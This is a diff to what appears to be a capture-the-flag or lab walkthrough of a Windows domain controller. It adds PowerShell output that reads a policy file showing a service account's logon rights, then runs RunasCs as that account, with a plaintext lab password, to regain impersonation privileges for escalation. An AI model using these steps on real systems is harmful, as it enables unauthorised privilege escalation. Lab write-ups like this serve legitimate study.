@@ -355,7 +355,36 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 ### Step 4 — RunasCs with Service Logon for SeImpersonatePrivilege
 
-The `Policy_Backup.inf` found on DC02 shows `svc_sql` has `SeServiceLogonRight`. Using `RunasCs` with `--logon-type 5` (service logon) restores the full token:
+The `Policy_Backup.inf` found on DC02 shows `svc_sql` has `SeServiceLogonRight`. 
+```powershell
+PS C:\Windows\system32> cd c:\
+PS C:\> ls
+
+
+    Directory: C:\
+
+
+Mode                 LastWriteTime         Length Name                                     
+----                 -------------         ------ ----                                     
+d-----          5/8/2021   8:15 AM                PerfLogs                                 
+d-r---         7/29/2025   2:49 PM                Program Files                            
+d-----         7/29/2025   2:48 PM                Program Files (x86)                      
+d-r---         7/29/2025   3:23 PM                Users                                    
+d-----         7/30/2025  10:57 PM                Windows                                  
+-a----         7/30/2025   1:38 PM          18594 Policy_Backup.inf                        
+
+
+PS C:\> type C:\Policy_Backup.inf
+[Unicode]
+Unicode=yes
+[System Access]
+...
+[Privilege Rights]
+...
+SeServiceLogonRight = *S-1-5-20,svc_sql,SQLServer2005SQLBrowserUser$DC02,*S-1-5-80-0,*S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775,*S-1-5-80-344959196-2060754871-2302487193-2804545603-1466107430,*S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
+
+```
+Using `RunasCs` with `--logon-type 5` (service logon) restores the full token:
 
 ```powershell
 ./runas.exe svc_sql Pa@ssw0rd123 "whoami /priv" -l 5 -b
